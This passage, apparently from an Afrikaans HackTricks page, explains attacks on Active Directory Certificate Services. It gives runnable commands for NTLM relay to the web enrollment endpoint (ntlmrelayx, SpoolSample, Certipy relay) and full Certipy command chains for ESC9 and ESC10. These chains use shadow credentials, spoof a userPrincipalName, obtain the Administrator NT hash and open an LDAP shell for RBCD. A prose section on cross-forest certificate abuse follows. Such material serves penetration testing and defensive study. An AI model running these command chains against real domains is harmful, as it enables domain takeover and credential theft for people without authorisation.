proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)

Die versoek vir 'n sertifikaat word standaard deur Certipy gemaak gebaseer op die sjabloon `Machine` of `User`, bepaal deur of die rekeningnaam wat oorgedra word, eindig met `$`. Die spesifikasie van 'n alternatiewe sjabloon kan bereik word deur die gebruik van die `-template` parameter.

'n Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan dan gebruik word om outentisering af te dwing. Wanneer dit met domeinbeheerders hanteer word, is die spesifikasie van `-template DomainController` vereis.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Geen Sekuriteitsuitbreiding - ESC9 <a href="#5485" id="5485"></a>

### Verduideliking

Die nuwe waarde **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) vir **`msPKI-Enrollment-Flag`**, bekend as ESC9, voorkom die insluiting van die **nuwe `szOID_NTDS_CA_SECURITY_EXT` sekuriteitsuitbreiding** in 'n sertifikaat. Hierdie vlag word relevant wanneer `StrongCertificateBindingEnforcement` op `1` ingestel is (die verstekinstelling), wat teenstrydig is met 'n instelling van `2`. Sy relevansie word verhoog in scenario's waar 'n swakker sertifikaatkartering vir Kerberos of Schannel benut kan word (soos in ESC10), aangesien die afwesigheid van ESC9 nie die vereistes sal verander nie.

Die voorwaardes waaronder hierdie vlag se instelling betekenisvol word, sluit in:
- `StrongCertificateBindingEnforcement` is nie aangepas na `2` (met die verstekinstelling van `1`), of `CertificateMappingMethods` sluit die `UPN`-vlag in.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION`-vlag binne die `msPKI-Enrollment-Flag`-instelling.
- Enige kliëntverifikasie EKU word deur die sertifikaat gespesifiseer.
- `GenericWrite`-toestemmings is beskikbaar oor enige rekening om 'n ander te kompromitteer.

### Misbruikscenario

Stel `John@corp.local` het `GenericWrite`-toestemmings oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te kompromitteer. Die `ESC9` sertifikaatsjabloon, waarin `Jane@corp.local` mag inskryf, is gekonfigureer met die `CT_FLAG_NO_SECURITY_EXTENSION`-vlag in sy `msPKI-Enrollment-Flag`-instelling.

Aanvanklik word `Jane` se hasie bekom deur gebruik te maak van Skaduweelegitieme, danksy `John` se `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Daarna word `Jane` se `userPrincipalName` verander na `Administrator`, met opset om die `@corp.local` domein gedeelte weg te laat:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie wysiging oortree nie beperkings nie, aangesien `Administrator@corp.local` steeds onderskeidelik as `Administrator` se `userPrincipalName` bly.

Daarna word die `ESC9` sertifikaatsjabloon, wat as kwesbaar gemerk is, aangevra as `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Dit is opgemerk dat die sertifikaat se `userPrincipalName` `Administrator` weerspieël, sonder enige "object SID".

`Jane` se `userPrincipalName` word dan teruggesit na haar oorspronklike, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Poging tot verifikasie met die uitgereikte sertifikaat lewer nou die NT-hash van `Administrator@corp.local` op. Die opdrag moet `-domain <domain>` insluit as gevolg van die sertifikaat se gebrek aan domeinspesifikasie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Swak Sertifikaat Karterings - ESC10

### Verduideliking

Twee register sleutelwaardes op die domeinbeheerder word deur ESC10 genoem:

- Die verstekwaarde vir `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), voorheen ingestel op `0x1F`.
- Die verstekinstelling vir `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, voorheen `0`.

**Geval 1**

Wanneer `StrongCertificateBindingEnforcement` ingestel is as `0`.

**Geval 2**

As `CertificateMappingMethods` die `UPN` bit (`0x4`) insluit.

### Misbruik Geval 1

Met `StrongCertificateBindingEnforcement` ingestel as `0`, kan 'n rekening A met `GenericWrite` toestemmings uitgebuit word om enige rekening B te kompromitteer.

Byvoorbeeld, deur `GenericWrite` toestemmings oor `Jane@corp.local` te hê, mik 'n aanvaller daarop om `Administrator@corp.local` te kompromitteer. Die prosedure boots ESC9 na, wat enige sertifikaat templaat toelaat om gebruik te word.

Aanvanklik word `Jane` se has opgehaal deur gebruik te maak van Shadow Credentials, wat die `GenericWrite` uitbuit.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Daarna word `Jane` se `userPrincipalName` verander na `Administrator`, met opset om die `@corp.local` gedeelte uit te laat om 'n beperkingsoortreding te vermy.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Volgens hierdie, word 'n sertifikaat wat kliëntverifikasie moontlik maak, aangevra as `Jane`, met behulp van die verstek `User` sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word dan teruggesit na sy oorspronklike waarde, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die verifikasie met die verkrygte sertifikaat sal die NT-hash van `Administrator@corp.local` lewer, wat die spesifikasie van die domein in die opdrag noodsaaklik maak as gevolg van die afwesigheid van domeinbesonderhede in die sertifikaat.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Misbruikgeval 2

Met die `CertificateMappingMethods` wat die `UPN`-bitvlag (`0x4`) bevat, kan 'n rekening A met `GenericWrite`-toestemmings enige rekening B wat 'n `userPrincipalName`-eienskap ontbreek, insluitend masjienrekeninge en die ingeboude domein-administrateur `Administrator`, in gevaar bring.

Hier is die doel om `DC$@corp.local` in gevaar te bring, beginnende met die verkryging van `Jane` se has deur middel van Shadow Credentials, deur gebruik te maak van die `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` se `userPrincipalName` word dan ingestel as `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
'n Sertifikaat vir klientverifikasie word aangevra as `Jane` met die verstek `User` sjabloon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word teruggedraai na sy oorspronklike waarde na hierdie proses.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Om te verifieer via Schannel, word die `-ldap-shell` opsie van Certipy gebruik, wat aandui dat verifikasie suksesvol was as `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Deur middel van die LDAP-skulp, maak opdragte soos `set_rbcd` dit moontlik om Hulpbron-Gebaseerde Beperkte Delegasie (RBCD) aanvalle uit te voer, wat potensieel die domeinbeheerder kan benadeel.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hierdie kwesbaarheid strek ook na enige gebruikersrekening sonder 'n `userPrincipalName` of waar dit nie ooreenstem met die `sAMAccountName` nie, met die verstek `Administrator@corp.local` as 'n primêre teiken as gevolg van sy verhoogde LDAP-voorregte en die afwesigheid van 'n `userPrincipalName` per verstek.


## Kompromittering van Bosse met Sertifikate Verduidelik in Passiewe Stem

### Verbreek van Bosvertroue deur Gekompromitteerde CAs

Die konfigurasie vir **oor-bos inskrywing** word relatief eenvoudig gemaak. Die **wortel CA-sertifikaat** van die hulpbronbos word deur administrateurs **gepubliseer na die rekeningbosse**, en die **ondernemings-CA-sertifikate** van die hulpbronbos word **bygevoeg tot die `NTAuthCertificates` en AIA-houers in elke rekeningbos**. Om dit te verduidelik, verleen hierdie reëling die **CA in die hulpbronbos volledige beheer** oor alle ander bosse waarvoor dit PKI bestuur. Indien hierdie CA deur aanvallers **gekompromitteer word**, kan sertifikate vir alle gebruikers in beide die hulpbron- en rekeningbosse deur hulle **vervalste word**, en sodoende die veiligheidsgrens van die bos verbreek.

### Inskrywingsvoorregte wat aan Buitelandse Prinsipale Verleen Word

In omgewings met meervoudige bosse, word versigtigheid vereis met betrekking tot Ondernemings-CA's wat **sertifikaatsjablone publiseer** wat **Geauthentiseerde Gebruikers of buitelandse prinsipale** (gebruikers/groepe buite die bos waartoe die Ondernemings-CA behoort) **inskrywings- en wysigingsregte** toelaat.\
By verifikasie oor 'n vertroue, word die **Geauthentiseerde Gebruikers SID** by die gebruiker se token gevoeg deur AD. Dus, as 'n domein 'n Ondernemings-CA besit met 'n sjabloon wat **Geauthentiseerde Gebruikers inskrywingsregte toelaat**, kan 'n sjabloon potensieel **ingeskryf word deur 'n gebruiker uit 'n ander bos**. Op dieselfde manier, as **inskrywingsregte eksplisiet aan 'n buitelandse prinsipaal verleen word deur 'n sjabloon**, word 'n **oor-bos toegangsbeheer-verhouding daardeur geskep**, wat 'n prinsipaal uit een bos in staat stel om in te skryf op 'n sjabloon uit 'n ander bos.

Beide scenario's lei tot 'n **toename in die aanvalsvlak** van die een bos na die ander. Die instellings van die sertifikaatsjabloon kan deur 'n aanvaller uitgebuit word om addisionele voorregte in 'n vreemde domein te verkry.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
